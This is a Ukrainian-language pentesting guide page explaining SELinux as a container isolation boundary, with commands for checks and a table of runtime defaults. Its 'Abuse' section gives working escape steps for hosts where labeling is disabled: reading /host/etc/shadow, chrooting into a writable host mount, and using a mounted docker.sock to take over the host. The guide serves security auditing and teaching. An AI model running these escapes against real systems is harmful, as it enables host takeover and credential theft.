# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

SELinux — це **орієнтована на мітки система обов'язкового контролю доступу**. Кожен релевантний процес і об'єкт може мати security context, а політика вирішує, які домени можуть взаємодіяти з якими типами і яким чином. У контейнеризованих середовищах це зазвичай означає, що runtime запускає процес container під обмеженим container domain і мітить вміст контейнера відповідними типами. Якщо політика працює правильно, процес зможе читати та записувати те, до чого його мітка повинна мати доступ, і при цьому буде відмовлено в доступі до іншого вмісту хоста, навіть якщо цей вміст стає видимим через mount.

Це один із найпотужніших захистів на стороні хоста, доступних у поширених розгортаннях Linux container. Він особливо важливий на Fedora, RHEL, CentOS Stream, OpenShift та в інших екосистемах, орієнтованих на SELinux. У таких середовищах рецензент, який ігнорує SELinux, часто неправильно зрозуміє, чому очевидний шлях до компрометації хоста фактично заблоковано.

## AppArmor Vs SELinux

Найпростіша відмінність на високому рівні полягає в тому, що AppArmor базується на шляхах (path-based), тоді як SELinux — **орієнтований на мітки**. Це має великі наслідки для безпеки container. Політика, що базується на шляхах, може вести себе інакше, якщо той самий вміст хоста стає доступним під несподіваним mount шляхом. Орієнтована на мітки політика натомість питає, якою є мітка об'єкта і що домен процесу може з нею робити. Це не робить SELinux простим, але робить його стійким до класу припущень про трюки з шляхами, які захисники іноді випадково роблять у системах на базі AppArmor.

Оскільки модель орієнтована на мітки, обробка томів container і рішення про перевмітку (relabeling) мають критичне значення для безпеки. Якщо runtime або оператор змінює мітки занадто широко, щоб «make mounts work», межа політики, яка мала містити робоче навантаження, може стати значно слабшою, ніж передбачалося.

## Лабораторія

Щоб перевірити, чи активовано SELinux на хості:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Щоб переглянути наявні мітки на хості:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Щоб порівняти нормальний запуск з запуском, де маркування вимкнено:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
На хості з увімкненим SELinux це дуже практична демонстрація, оскільки вона показує різницю між робочим навантаженням, що працює під очікуваним доменом контейнера, і тим, яке було позбавлене цього рівня примусового контролю.

## Runtime Usage

Podman особливо добре узгоджується з SELinux на системах, де SELinux є частиною стандартного набору платформи. Rootless Podman у поєднанні з SELinux — одна з найміцніших звичайних базових конфігурацій контейнера, тому що процес уже не має привілеїв на боці хоста і все ще обмежений політикою MAC. Docker також може використовувати SELinux там, де це підтримується, хоча адміністратори іноді вимикають його, щоб обійти проблеми з маркуванням томів. CRI-O і OpenShift значною мірою покладаються на SELinux як частину своєї історії ізоляції контейнерів. Kubernetes також може експонувати налаштування, пов’язані з SELinux, але їхня цінність очевидно залежить від того, чи підтримує і застосовує SELinux ОС вузла.

Повторювана настанова полягає в тому, що SELinux — це не додатковий шар. У екосистемах, побудованих навколо нього, він є частиною очікуваного кордону безпеки.

## Misconfigurations

Класична помилка — `label=disable`. Операційно це часто трапляється через те, що монтування тома було відхилено, і найшвидшим тимчасовим рішенням було виключити SELinux з рівня замість того, щоб виправити модель маркування. Інша поширена помилка — некоректне повторне маркування вмісту хоста. Широкі операції з повторного маркування можуть змусити застосунок працювати, але вони також можуть розширити те, до чого контейнер дозволено звертатися, набагато далі, ніж передбачалося спочатку.

Також важливо не плутати **installed** SELinux з **effective** SELinux. Хост може підтримувати SELinux і все ще перебувати в пермісивному режимі, або runtime може не запускати робоче навантаження під очікуваним доменом. У таких випадках захист значно слабший, ніж може припускати документація.

## Abuse

Коли SELinux відсутній, у пермісивному режимі або широко вимкнений для робочого навантаження, шляхи, змонтовані з боку хоста, стають набагато простіше використовувати зловмисно. Той самий bind mount, який інакше був би обмежений мітками, може стати прямим шляхом до даних хоста або до модифікації хоста. Це особливо актуально у поєднанні з writable volume mounts, каталогами container runtime або оперативними спрощеннями, які для зручності розкривають конфіденційні шляхи хоста.

SELinux часто пояснює, чому загальний writeup про breakout працює миттєво на одному хості, але систематично не вдається на іншому, хоча runtime flags виглядають подібно. Часто відсутній інгредієнт — не простір імен або capability, а саме кордон міток, який залишився цілим.

Найшвидша практична перевірка — порівняти активний контекст, а потім опитати змонтовані шляхи хоста або runtime directories, які зазвичай обмежені мітками:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Якщо присутній host bind mount і маркування SELinux було вимкнено або послаблено, розкриття інформації часто відбувається насамперед:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Якщо mount доступний для запису і container фактично є host-root з точки зору kernel, наступний крок — перевірити контрольовану модифікацію хоста замість здогадок:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
На хостах, що підтримують SELinux, втрата міток навколо каталогів стану виконання також може відкрити прямі шляхи privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Ці команди не замінюють повний escape chain, але вони дуже швидко показують, чи саме SELinux заважав доступу до даних хоста або зміні файлів на стороні хоста.

### Повний приклад: SELinux вимкнено + монтування хоста доступне для запису

Якщо SELinux labeling вимкнено і файлова система хоста змонтована з правом запису в `/host`, повний host escape перетворюється на звичайний bind-mount abuse випадок:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Якщо `chroot` вдасться, процес контейнера тепер працює з файлової системи хоста:
```bash
id
hostname
cat /etc/passwd | tail
```
### Повний приклад: SELinux Disabled + Runtime Directory

Якщо робоче навантаження може дістатися до runtime socket після того, як labels вимкнено, escape можна делегувати runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Важливе спостереження: SELinux часто був механізмом, який саме перешкоджав доступу такого роду до host-path або runtime-state.

## Перевірки

Метою перевірок SELinux є підтвердження того, що SELinux увімкнено, визначення поточного security context і перевірка, чи файли або шляхи, що вас цікавлять, фактично є label-confined.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Цікаве тут:

- `getenforce` ідеально має повернути `Enforcing`; `Permissive` або `Disabled` змінюють сенс усього розділу SELinux.
- Якщо поточний контекст процесу виглядає несподівано або занадто широким, workload може не виконуватись під очікуваною політикою контейнера.
- Якщо файли, змонтовані з хоста, або runtime-каталоги мають мітки, до яких процес має надто вільний доступ, bind mounts стають набагато небезпечнішими.

При перевірці контейнера на платформі із підтримкою SELinux не сприймайте маркування як другорядну деталь. У багатьох випадках це одна з головних причин, чому хост ще не скомпрометовано.

## Налаштування runtime за замовчуванням

| Runtime / платформа | Стан за замовчуванням | Поведінка за замовчуванням | Поширені ручні послаблення |
| --- | --- | --- | --- |
| Docker Engine | Залежить від хоста | Розділення SELinux доступне на хостах із увімкненим SELinux, але точна поведінка залежить від конфігурації хоста/демону | `--security-opt label=disable`, широке повторне маркування bind mounts, `--privileged` |
| Podman | Зазвичай увімкнений на хостах з SELinux | Розділення SELinux є звичайною частиною Podman на системах SELinux, якщо його не вимкнено | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Зазвичай не призначається автоматично на рівні Pod | Підтримка SELinux є, але Pods звичайно потребують `securityContext.seLinuxOptions` або специфічних для платформи значень за замовчуванням; потрібна підтримка runtime та вузла | слабкі або широкі `seLinuxOptions`, виконання на вузлах із permissive/disabled, політики платформи, що вимикають маркування |
| CRI-O / OpenShift style deployments | Зазвичай широко використовується | SELinux часто є основною частиною моделі ізоляції вузла в таких середовищах | кастомні політики, які надмірно розширюють доступ, вимкнення маркування заради сумісності |

SELinux за замовчуванням більш залежний від дистрибутива, ніж seccomp. На системах типу Fedora/RHEL/OpenShift SELinux часто є центральним елементом моделі ізоляції. На системах без SELinux його просто немає.
